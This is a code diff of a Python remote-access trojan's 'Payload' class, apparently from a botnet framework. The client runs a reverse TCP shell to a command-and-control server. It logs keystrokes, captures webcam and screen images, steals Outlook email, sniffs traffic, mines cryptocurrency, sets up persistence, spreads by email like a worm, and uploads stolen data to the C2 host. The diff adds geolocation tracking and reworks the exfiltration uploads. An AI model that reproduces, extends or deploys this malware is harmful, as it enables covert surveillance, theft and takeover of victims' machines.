@@ -36,10 +36,12 @@ try:
 except ImportError:
     pass
 
+
 def log(info, level='debug'):
     logging.basicConfig(level=logging.DEBUG, handlers=[logging.StreamHandler()])
     logger = logging.getLogger(__name__)
     getattr(logger, level)(str(info)) if hasattr(logger, level) else logger.debug(str(info))
+
 
 def config(*arg, **options):
     """
@@ -51,9 +53,10 @@ def config(*arg, **options):
             return function(*args, **kwargs)
         for k,v in options.items():
             setattr(wrapper, k, v)
-        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
+        wrapper.platforms = ['win32','linux','linux2','darwin'] if not 'platforms' in options else options['platforms']
         return wrapper
     return _config
+
 
 def threaded(function):
     """
@@ -75,6 +78,7 @@ def threaded(function):
 _abort = False
 _debug = '--debug' in sys.argv
 
+
 class Payload():
     """
     Reverse TCP shell designed to provide remote access
@@ -94,19 +98,24 @@ class Payload():
         """
         self.handlers = {}
         self.remote = {'modules': [], 'packages': []}
+        self.gui = True if kwargs.get('gui') else False
+        self.owner = kwargs.get('owner')
         self.flags = self._get_flags()
         self.c2 = (host, port)
         self.connection = self._get_connection(host, port)
         self.key = self._get_key(self.connection)
         self.info = self._get_info()
 
+
     def _get_flags(self):
         return collections.namedtuple('flag', ('connection','passive','prompt'))(threading.Event(), threading.Event(), threading.Event())
+
 
     def _get_command(self, cmd):
         if bool(hasattr(self, cmd) and hasattr(getattr(self, cmd), 'command') and getattr(getattr(self, cmd),'command')):
             return getattr(self, cmd)
         return False
+
 
     def _get_connection(self, host, port):
         while True:
@@ -124,6 +133,7 @@ class Payload():
         self.flags.passive.clear()
         return connection
 
+
     def _get_key(self, connection):
         if isinstance(connection, socket.socket):
             if 'diffiehellman' in globals() and callable(globals()['diffiehellman']):
@@ -132,6 +142,7 @@ class Payload():
                 raise Exception("unable to complete session key exchange: missing required function 'diffiehellman'")
         else:
             raise TypeError("invalid object type for argument 'connection' (expected {}, received {})".format(socket.socket, type(connection)))
+
 
     def _get_info(self):
         info = {}
@@ -142,10 +153,21 @@ class Payload():
                     info[function] = "_b64__" + base64.b64encode(info[function]).decode('ascii')
             except Exception as e:
                 log("{} returned error: {}".format(function, str(e)))
+
+        # add owner of session for web application
+        info['owner'] = "_b64__" + base64.b64encode(str(self.owner).encode('utf-8')).decode('ascii')
+
+        # add geolocation of host machine
+        latitude, longitude = globals()['geolocation']()
+        info['latitude'] = "_b64__" + base64.b64encode(latitude.encode('utf-8')).decode('ascii')
+        info['longitude'] = "_b64__" + base64.b64encode(longitude.encode('utf-8')).decode('ascii')
+
+        # encrypt and send data to server
         data = globals()['encrypt_aes'](json.dumps(info), self.key)
         msg = struct.pack('!L', len(data)) + data
         self.connection.sendall(msg)
         return info
+
 
     def _get_resources(self, target=None, base_url=None):
         if sys.version_info[0] < 3:
@@ -189,6 +211,7 @@ class Payload():
         except Exception as e:
             log("{} error: {}".format(self._get_resources.__name__, str(e)))
 
+
     @threaded
     def _get_prompt_handler(self):
         self.send_task({"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
@@ -203,17 +226,19 @@ class Payload():
                 log(str(e))
                 break
 
+
     @threaded
     def _get_thread_handler(self):
         while True:
             jobs = self.handlers.items()
             deadpool = []
             for task, worker in jobs:
-                try:
-                    if not worker.is_alive():
-                        deadpool.append(task)
-                except Exception as e:
-                    log(str(e))
+                if worker:
+                    try:
+                        if not worker.is_alive():
+                            deadpool.append(task)
+                    except Exception as e:
+                        log(str(e))
             for task in deadpool:
                 dead = self.handlers.pop(task, None)
                 del dead
@@ -221,7 +246,8 @@ class Payload():
                 break
             time.sleep(0.5)
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='cd <path>')
     def cd(self, path='.'):
         """
         Change current working directory
@@ -230,12 +256,14 @@ class Payload():
         :param str path:  target directory (default: current directory)
 
         """
-        if os.path.isdir(path):
-            return os.chdir(path)
-        else:
-            return os.chdir('.')
+        try:
+            os.chdir(path)
+            return os.getcwd()
+        except:
+            return "{}: No such file or directory".format(path)
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='ls <path>')
     def ls(self, path='.'):
         """
         List the contents of a directory
@@ -255,7 +283,8 @@ class Payload():
         else:
             return "Error: path not found"
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='cat <path>')
     def cat(self, path):
         """
         Display file contents
@@ -275,54 +304,8 @@ class Payload():
                     break
         return '\n'.join(output)
 
-    @config(platfoms=['win32','linux2','darwin'], command=False)
-    def ftp(self, source, filetype=None, host=None, user=None, password=None):
-        """
-        Upload file/data to FTP server
 
-        `Required`
-        :param str source:    data or filename to upload
-
-        `Optional`
-        :param str filetype:  upload file type
-        :param str host:      FTP server hostname
-        :param str user:      FTP server login user
-        :param str password:  FTP server login password
-
-        """
-        try:
-            for attr in ('host', 'user', 'password'):
-                if not locals().get(attr):
-                    raise Exception("missing credential '{}' is required for FTP uploads".format(attr))
-            path  = ''
-            local = time.ctime().split()
-            if os.path.isfile(str(source)):
-                path   = source
-                source = open(str(path), 'rb')
-            elif hasattr(source, 'seek'):
-                source.seek(0)
-            else:
-                source = StringIO.StringIO(bytes(source))
-            host = ftplib.FTP(host=host, user=user, password=password)
-            addr = urlopen('http://api.ipify.org').read()
-            if 'tmp' not in host.nlst():
-                host.mkd('/tmp')
-            if addr not in host.nlst('/tmp'):
-                host.mkd('/tmp/{}'.format(addr))
-            if path:
-                path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
-            else:
-                if filetype:
-                    filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
-                    path = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
-                else:
-                    path = '/tmp/{}/{}'.format(addr, '{}-{}_{}'.format(local[1], local[2], local[3]))
-            stor = host.storbinary('STOR ' + path, source)
-            return path
-        except Exception as e:
-            return "{} error: {}".format(self.ftp.__name__, str(e))
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='pwd')
     def pwd(self, *args):
         """
         Show name of present working directory
@@ -330,7 +313,8 @@ class Payload():
         """
         return os.getcwd()
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='eval <code>')
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='eval <code>')
     def eval(self, code):
         """
         Execute Python code in current context
@@ -344,7 +328,8 @@ class Payload():
         except Exception as e:
             return "{} error: {}".format(self.eval.__name__, str(e))
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='wget <url>')
     def wget(self, url, filename=None):
         """
         Download file from URL
@@ -356,6 +341,13 @@ class Payload():
         :param str filename:    name of the file to save the file as
 
         """
+        if sys.version_info[0] < 3:
+            from urllib import urlretrieve
+            from urllib2 import urlopen, urlparse
+            import StringIO
+        else:
+            from urllib import parse as urlparse
+            from urllib.request import urlopen, urlretrieve
         if url.startswith('http'):
             try:
                 path, _ = urlretrieve(url, filename) if filename else urlretrieve(url)
@@ -365,7 +357,8 @@ class Payload():
         else:
             return "Invalid target URL - must begin with 'http'"
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='kill')
     def kill(self):
         """
         Shutdown the current connection
@@ -384,7 +377,8 @@ class Payload():
         except Exception as e:
             log("{} error: {}".format(self.kill.__name__, str(e)))
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='help [cmd]')
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='help [cmd]')
     def help(self, name=None):
         """
         Show usage help for commands and modules
@@ -395,18 +389,19 @@ class Payload():
         """
         if not name:
             try:
-                return json.dumps({v.usage: v.func_doc.strip('\n').splitlines()[0].lower() for k,v in vars(Payload).items() if callable(v) if hasattr(v, 'command') if getattr(v, 'command')})
+                return json.dumps({v.usage: v.__doc__.strip('\n').splitlines()[0].lower() for k,v in vars(Payload).items() if callable(v) if hasattr(v, 'command') if getattr(v, 'command')})
             except Exception as e:
                 log("{} error: {}".format(self.help.__name__, str(e)))
         elif hasattr(Payload, name) and hasattr(getattr(Payload, name), 'command'):
             try:
-                return json.dumps({getattr(Payload, name).usage: getattr(Payload, name).func_doc})
+                return json.dumps({getattr(Payload, name).usage: getattr(Payload, name).__doc__})
             except Exception as e:
                 log("{} error: {}".format(self.help.__name__, str(e)))
         else:
             return "'{}' is not a valid command and is not a valid module".format(name)
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='load <module> [target]')
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='load <module> [target]')
     def load(self, args):
         """
         Remotely import a module or package
@@ -439,7 +434,8 @@ class Payload():
                     log("{} error: {}".format(self.load.__name__, str(e)))
                     return "{} error: {}".format(self.load.__name__, str(e))
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='stop <job>')
     def stop(self, target):
         """
         Stop a running job
@@ -457,7 +453,8 @@ class Payload():
         except Exception as e:
             log("{} error: {}".format(self.stop.__name__, str(e)))
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='show <value>')
     def show(self, attribute):
         """
         Show value of an attribute
@@ -495,7 +492,8 @@ class Payload():
         except Exception as e:
             log("'{}' error: {}".format(_threads.__name__, str(e)))
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='abort')
     def abort(self, *args):
         """
         Abort execution and self-destruct
@@ -522,6 +520,7 @@ class Payload():
             taskkill.start()
             sys.exit()
 
+
     @config(platforms=['darwin'], command=True, usage='icloud')
     def icloud(self):
         """
@@ -532,33 +531,11 @@ class Payload():
             self.load('icloud')
         return globals()['icloud'].run()
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
-    def phone(self, args):
-        """
-        Use an online phone to send text messages
 
-        `Required`
-        :param str phone:     recipient phone number
-        :param str message:   text message to send
-
-        `Optional`
-        :param str account:   Twilio account SID
-        :param str token:     Twilio auth token
-        :param str api:       Twilio api key
-
-        """
-        if 'phone' not in globals():
-            self.load('phone')
-        args = globals()['kwargs'](args)
-        if all():
-            return globals()['phone'].run(number=args.number, message=args.message, sid=args.sid, token=args.token)
-        else:
-            return 'usage: <send/read> [args]\n  arguments:\n\tnumber: phone number with country code - no spaces (ex. 18001112222)\n\tmessage: text message to send surrounded by quotes (ex. "example text message")\n\tsid: twilio account SID\n\ttoken: twilio auth token'
-
-    @config(platforms=['linux2','darwin'], command=True, usage='miner <url> <user> <pass>')
+    @config(platforms=['linux','linux2','darwin'], command=True, usage='miner <url> <user> <pass>')
     def miner(self, args):
         """
-        Run Bitcoin miner in the background
+        Run cryptocurrency miner in the background
 
         `Required`
         :param str url:         stratum mining server url
@@ -573,37 +550,14 @@ class Payload():
             url, username, password = args
             try:
                 globals()['miner'].run(url, username, password)
-                return """Bitcoin miner running in background\nURL: {0}\nUser: {1}""".format(url, username)
+                return """Miner running in background\nURL: {0}\nUser: {1}""".format(url, username)
             except Exception as e:
                 return "{} error: {}".format(self.miner.__name__, str(e))
         else:
             return "usage: {}".format(self.miner.usage)
 
-    @config(platforms=['win32','linux2','darwin'], command=False)
-    def imgur(self, source, api_key=None):
-        """
-        Upload image file/data to Imgur
 
-        `Required`
-        :param str source:    data or filename
-
-        """
-        try:
-            if api_key:
-                if not isinstance(api_key, str):
-                    raise TypeError("argument 'api_key' data type must be: {}".format(str))
-                if not api_key.lower().startswith('client-id'):
-                    api_key  = 'Client-ID {}'.format(api_key)
-                if 'normalize' in globals():
-                    source = normalize(source)
-                post = post('https://api.imgur.com/3/upload', headers={'Authorization': api_key}, data={'image': base64.b64encode(source), 'type': 'base64'})
-                return str(json.loads(post)['data']['link'])
-            else:
-                return "No Imgur API Key found"
-        except Exception as e2:
-            return "{} error: {}".format(self.imgur.__name__, str(e2))
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> [file]')
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='upload [file]')
     def upload(self, filename):
         """
         Upload file from client machine to the C2 server
@@ -617,9 +571,9 @@ class Payload():
                 host, port = self.connection.getpeername()
                 _, filetype = os.path.splitext(filename)
                 with open(filename, 'rb') as fp:
-                    source = base64.b64encode(fp.read())
-                data = {filetype: source}
-                globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+                    data = base64.b64encode(fp.read())
+                json_data = {'data': str(data), 'filename': filename, 'type': filetype, 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
+                globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
                 return "Upload complete"
             else:
                 return "Error: file not found"
@@ -627,21 +581,8 @@ class Payload():
             log("{} error: {}".format(self.upload.__name__, str(e)))
             return "Error: {}".format(str(e))
 
-    @config(platforms=['win32','linux2','darwin'], registry_key=r"Software\BYOB", command=True, usage='ransom <mode> [path]')
-    def ransom(self, args):
-        """
-        Encrypt personal files on client machine
 
-        `Required`
-        :param str mode:        encrypt, decrypt, payment
-        :param str target:      target filename or directory path
-
-        """
-        if 'ransom' not in globals():
-            self.load('ransom')
-        return globals()['ransom'].run(args)
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='webcam <mode> [options]')
     def webcam(self, args=None):
         """
         Capture image/video from client webcam
@@ -655,6 +596,7 @@ class Payload():
 
         """
         try:
+            host, port = self.connection.getpeername()
             if 'webcam' not in globals():
                 self.load('webcam')
             if not args:
@@ -670,22 +612,21 @@ class Payload():
                     port = int(args[1])
                     globals()['webcam'].stream(host=host, port=port)
             elif 'image' in args:
-                img = globals()['webcam'].image(*args)
-                data = {"png": img}
-                host, port = self.connection.getpeername()
-                globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+                data = globals()['webcam'].image(*args)
+                json_data = {"data": str(data), "type": "png", "owner": self.owner, "module": self.webcam.__name__, "session": self.info.get('public_ip')}
+                globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
             elif 'video' in args:
-                vid = globals()['webcam'].video(*args)
-                data = {"avi": vid}
-                host, port = self.connection.getpeername()
-                globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+                data = globals()['webcam'].video(*args)
+                json_data = {"data": str(data), "type": "avi", "owner": self.owner, "module": self.webcam.__name__, "session": self.info.get('public_ip')}
+                globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
             else:
                 return self.webcam.usage
             return "Webcam capture complete"
         except Exception as e:
             log("{} error: {}".format(self.webcam.__name__, str(e)))
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='passive')
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='passive')
     def passive(self):
         """
         Keep client alive while waiting to re-connect
@@ -695,7 +636,8 @@ class Payload():
         self.flags.connection.clear()
         self.flags.passive.set()
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='restart [output]')
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='restart [output]')
     def restart(self, output='connection'):
         """
         Restart the shell
@@ -708,6 +650,7 @@ class Payload():
             os.execl(sys.executable, 'python', os.path.abspath(sys.argv[0]), *sys.argv[1:])
         except Exception as e:
             log("{} error: {}".format(self.restart.__name__, str(e)))
+
 
     @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
     def outlook(self, args=None):
@@ -738,8 +681,9 @@ class Payload():
                         results = globals()['outlook'].results
                         if len(results):
                             host, port = self.connection.getpeername()
-                            data = {'txt': base64.b64encode(json.dumps(results))}
-                            globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+                            data = base64.b64encode(json.dumps(results))
+                            json_data = {'data': str(data), 'type': 'txt', 'owner': self.owner, "module": self.outlook.__name__, "session": self.info.get('public_ip')}
+                            globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
                             return "Upload of Outlook emails complete"
                     elif hasattr(globals()['outlook'], mode):
                         return getattr(globals()['outlook'], mode)()
@@ -749,6 +693,7 @@ class Payload():
                     return self.outlook.usage
             except Exception as e:
                 log("{} error: {}".format(self.email.__name__, str(e)))
+
 
     @config(platforms=['win32'], command=True, usage='escalate')
     def escalate(self):
@@ -763,7 +708,8 @@ class Payload():
         except Exception as e:
             log("{} error: {}".format(self.escalate.__name__, str(e)))
 
-    @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
+
+    @config(platforms=['win32','linux','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
     def execute(self, args):
         """
         Run an executable program in a hidden process
@@ -794,6 +740,7 @@ class Payload():
         else:
             return "File '{}' not found".format(str(path))
 
+
     @config(platforms=['win32'], command=True, usage='process <mode>')
     def process(self, args=None):
         """
@@ -817,9 +764,10 @@ class Payload():
                 elif 'upload' in cmd:
                     log = globals()['process'].log.getvalue()
                     if len(log):
-                        data = {'log': base64.b64encode(log)}
                         host, port = self.connection.getpeername()
-                        globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+                        data = base64.b64encode(log)
+                        json_data = {'data': str(data), 'type': 'log', 'owner': self.owner, "module": self.process.__name__, "session": self.info.get('public_ip')}
+                        globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
                         return "Process log upload complete"
                     else:
                         return "Process log is empty"
@@ -829,8 +777,9 @@ class Payload():
         except Exception as e:
             log("{} error: {}".format(self.process.__name__, str(e)))
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <target>')
-    def portscan(self, target=None):
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='portscanner <target>')
+    def portscanner(self, target=None):
         """
         Scan a target host or network to identify
         other target hosts and open ports.
@@ -847,35 +796,12 @@ class Payload():
                     return "Error: invalid IP address '%s'" % target
                 return globals()['portscanner'].run(target)
             else:
-                return self.portscan.usage
+                return self.portscanner.usage
         except Exception as e:
-            log("{} error: {}".format(self.portscan.__name__, str(e)))
+            log("{} error: {}".format(self.portscanner.__name__, str(e)))
 
-    def pastebin(self, source, api_key=None):
-        """
-        Dump file/data to Pastebin
 
-        `Required`
-        :param str source:      data or filename
-
-        `Optional`
-        :param str api_key:     Pastebin api_dev_key
-
-        Returns URL of pastebin document as a string
-
-        """
-        try:
-            if api_key:
-                info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
-                paste = globals()['post']('https://pastebin.com/api/api_post.php',data=info)
-                parts = urlparse.urlsplit(paste)
-                return urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
-            else:
-                return "{} error: no pastebin API key".format(self.pastebin.__name__)
-        except Exception as e:
-            return '{} error: {}'.format(self.pastebin.__name__, str(e))
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='keylogger [mode]')
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='keylogger [mode]')
     def keylogger(self, mode=None):
         """
         Log user keystrokes
@@ -913,9 +839,10 @@ class Payload():
                 except: pass
                 return locals()['status']()
             elif 'upload' in mode:
-                data = base64.b64encode(globals()['keylogger'].logs.getvalue())
                 host, port = self.connection.getpeername()
-                globals()['post']('http://{}:{}'.format(host, port + 3), json={'txt': data})
+                data = base64.b64encode(globals()['keylogger'].logs.getvalue())
+                json_data = {'data': str(data), 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__, "session": self.info.get('public_ip')}
+                globals()['post']('http://{}:{}'.format(host, port + 3), json=json_data)
                 globals()['keylogger'].logs.reset()
                 return 'Keystroke log upload complete'
             elif 'status' in mode:
@@ -923,7 +850,8 @@ class Payload():
             else:
                 return keylogger.usage
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot <mode>')
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='screenshot')
     def screenshot(self, mode=None):
         """
         Capture a screenshot from host device
@@ -935,17 +863,18 @@ class Payload():
         try:
             if 'screenshot' not in globals():
                 self.load('screenshot')
-            img = globals()['screenshot'].run()
-            data = {"png": img}
             host, port = self.connection.getpeername()
-            globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+            data = globals()['screenshot'].run()
+            json_data = {"data": str(data), "owner": self.owner, "type": "png", "module": self.screenshot.__name__, "session": self.info.get('public_ip')}
+            globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
             return 'Screenshot complete'
         except Exception as e:
             result = "{} error: {}".format(self.screenshot.__name__, str(e))
             log(result)
             return result
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='persistence <add/remove> [method]')
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='persistence <add/remove> [method]')
     def persistence(self, args=None):
         """
         Establish persistence on client host machine
@@ -979,7 +908,8 @@ class Payload():
         except Exception as e:
             log("{} error: {}".format(self.persistence.__name__, str(e)))
 
-    @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode]')
+
+    @config(platforms=['linux','linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode]')
     def packetsniffer(self, args):
         """
         Capture traffic on local network
@@ -1005,9 +935,10 @@ class Payload():
                     log = globals()['packetsniffer'].log.getvalue()
                     if len(log):
                         globals()['packetsniffer'].log.reset()
-                        data = {'pcap': base64.b64encode(log)}
                         host, port = self.connection.getpeername()
-                        globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+                        data = base64.b64encode(log)
+                        json_data = {"data": str(data), "type": "pcap", "owner": self.owner, "module": self.packetsniffer.__name__, "session": self.info.get('public_ip')}
+                        globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
                         return "Network traffic log upload complete"
                     else:
                         return "Network traffic log is empty"
@@ -1016,7 +947,8 @@ class Payload():
         except Exception as e:
             log("{} error: {}".format(self.packetsniffer.__name__, str(e)))
 
-    @config(platforms=['win32','darwin','linux2'], command=True, usage='spread <gmail> <password>')
+
+    @config(platforms=['win32','darwin','linux','linux2'], command=True, usage='spread <gmail> <password> <URL email list>')
     def spread(self, args=None):
         """
         Activate worm-like behavior and begin spreading client via email
@@ -1026,7 +958,7 @@ class Payload():
         :param str password:    sender Gmail password
         :param str url:         URL of target email list
         """
-        if not args or len(str(args.split()) != 3):
+        if not args or len(str(args).split()) != 3:
             return self.spread.usage
         if 'spreader' not in globals():
             self.load('spreader')
@@ -1037,6 +969,7 @@ class Payload():
             return globals()['spreader'].run(gmail, password, attachment, recipients)
         except Exception as e:
             return '{} error: {}'.format(self.spread.__name__, str(e))
+
 
     def send_task(self, task):
         """
@@ -1076,6 +1009,7 @@ class Payload():
                 log("{} socket error: SERVER UNKNOWN COMMUNICATION FAILURE - {}".format(self.send_task.__name__, e))
             self.passive()
             #log("{} error: {}".format(self.send_task.__name__, str(e)))
+
 
     def recv_task(self):
         """
@@ -1117,18 +1051,24 @@ class Payload():
             self.passive()
             #log("{} error: {}".format(self.recv_task.__name__, str(e)))
 
+
     def run(self):
         """
         Initialize a reverse TCP shell
-
         """
         host, port = self.connection.getpeername()
+
+        # run 2 threads which remotely load packages/modules from c2 server
         self._get_resources(target=self.remote['modules'], base_url='http://{}:{}'.format(host, port + 1))
         self._get_resources(target=self.remote['packages'], base_url='http://{}:{}'.format(host, port + 2))
-        self.handlers['prompt_handler'] = self._get_prompt_handler()
+        self.handlers['prompt_handler'] = self._get_prompt_handler() if not self.gui else None
         self.handlers['thread_handler'] = self._get_thread_handler()
-        log(json.dumps(self.remote, indent=2))
+
+        # loop listening for tasks from server and sending responses.
+        # if connection is dropped, enter passive mode and retry connection every 30 seconds.
         while True:
+
+            # leave passive mode when connection re-established
             if self.flags.passive.is_set() and not self.flags.connection.is_set():
                 host, port = self.c2
                 self.connection = self._get_connection(host, port)
@@ -1136,12 +1076,16 @@ class Payload():
                 self.info = self._get_info()
                 log("{} : leaving passive mode.".format(self.run.__name__))
                 self.flags.prompt.set()
+
+            # active mode
             elif self.flags.connection.wait(timeout=1.0):
-                if not self.flags.prompt.is_set():
-                    task = self.recv_task()
+                task = self.recv_task()
+                if self.gui or not self.flags.prompt.is_set():
                     if isinstance(task, dict) and 'task' in task:
                         cmd, _, action = task['task'].partition(' ')
                         try:
+                            # run command as module if module exists.
+                            # otherwise, run as shell command in subprocess
                             command = self._get_command(cmd)
                             if command:
                                 result = command(action) if action else command()
@@ -1149,14 +1093,26 @@ class Payload():
                                 result, reserr = subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()
                                 if result == None:
                                     result = reserr
+
+                            # format result
                             if result != None:
-                                result = bytes().join(result)
+                                if type(result) in (list, tuple):
+                                    result = '\n'.join(result)
+                                elif type(result) == bytes:
+                                    result = str(result.decode())
+                                else:
+                                    result = str(result)
                         except Exception as e:
                             result = "{} error: {}".format(self.run.__name__, str(e)).encode()
                             log(result)
+
+
+                        # send response to server
                         task.update({'result': result})
                         self.send_task(task)
-                    self.flags.prompt.set()
+
+                    if not self.gui:
+                        self.flags.prompt.set()
                 elif self.flags.prompt.set() and not self.flags.connection.wait(timeout=1.0):
                     self.kill()
             else:
